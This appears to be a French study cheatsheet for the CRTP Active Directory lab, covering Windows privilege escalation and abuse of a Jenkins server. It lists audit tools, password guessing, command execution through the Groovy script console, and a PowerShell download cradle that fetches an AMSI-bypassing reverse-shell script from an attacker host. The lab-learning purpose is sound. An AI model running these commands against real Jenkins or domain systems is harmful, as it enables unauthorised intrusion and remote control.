# Cheatsheet - Privilege escalation

> [!summary] Objectif
> Mesurer les privilèges réels avant de chercher une élévation, puis passer les outils d'audit local standard — et penser aux apps web internes (Jenkins) souvent mal cloisonnées.

### Check current context

```cmd
whoami /all
```

### Check group membership (local + domaine)

```powershell
Get-LocalGroupMember -Group Administrators
Get-DomainGroupMember -Identity "Domain Admins"
```

Vérifier d'abord qu'un privilège n'est pas déjà présent avant de chercher une escalade inutile.

### Automated local checks

```powershell
. C:\AD\Tools\PowerUp.ps1 ; Invoke-AllChecks
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args
. C:\AD\Tools\PrivEscCheck.ps1 ; Invoke-PrivescCheck
```

`Invoke-AllChecks` peut renvoyer un service faible directement exploitable via `Invoke-ServiceAbuse -Name '<service>' -UserName '<DOMAIN>\<USER>'`.

### Abuse Jenkins (dcorp-ci) — LO5 / flags F07 & F08

> [!info] Objectif du chemin
> Jenkins tourne sur **dcorp-ci:8080**, sous un **compte de domaine**. But: exec de commande via Jenkins → shell **en tant que le service account** → ce compte a des accès plus larges.

**1. Joindre Jenkins**
```powershell
Get-DomainComputer -Identity dcorp-ci | select dnshostname,ipv4address   # trouver l'IP
```
Navigateur → `http://<dcorp-ci>:8080`

**2. S'authentifier → flag F07 (user de la console web)**
- Jenkins n'a souvent **pas de politique de mdp** → teste `username = password`.
- Sinon, la page autorise parfois **Sign up / créer un compte**.
- Le **username avec lequel tu te connectes** = **F07**.

**3. Exécuter une commande** — 2 voies selon tes droits :

*a) Script Console (Groovy)* — si accès admin, va sur `http://<dcorp-ci>:8080/script` :
```groovy
def cmd = "whoami"
println cmd.execute().text
// commande Windows :
println "cmd /c whoami /all".execute().text
```

*b) Build step (droit Configure sur un job)* — projet Freestyle → *Execute Windows batch command* → **Build Now** → lire *Console Output* :
```bat
whoami
whoami /all
```

**4. Identifier le service account → flag F08 (domain user du service Jenkins)**
La sortie de `whoami` (étape 3) = **le compte de domaine qui exécute Jenkins** = **F08** (format `dcorp\xxxx`).

**5. Shell interactif** (pour la suite du lab) — download-cradle dans le build/Groovy :
```bat
powershell -c "iex (iwr http://<ATTAQUANT>:8080/Invoke-PowerShellTcpEx.ps1 -UseBasicParsing)"
```
Listener + hébergement : cf section *Reverse shell* de [[Cheatsheet - Post-exploitation]] (héberger ≠ listener !). `Ex` = déjà armé + bypass AMSI.

> [!tip] Enchaînement
> Une fois shell en tant que service account Jenkins → refais `whoami /all`, cherche ses droits (local admin ? droits AD ?) → souvent le pivot vers dcorp-mgmt / la suite LO7.

**Link**
- [[Enumeration]]
- [[Cheatsheet - Lateral movement]]
- [[Cheatsheet - Post-exploitation]]
- [[Checklist - Méthodologie CRTP]]
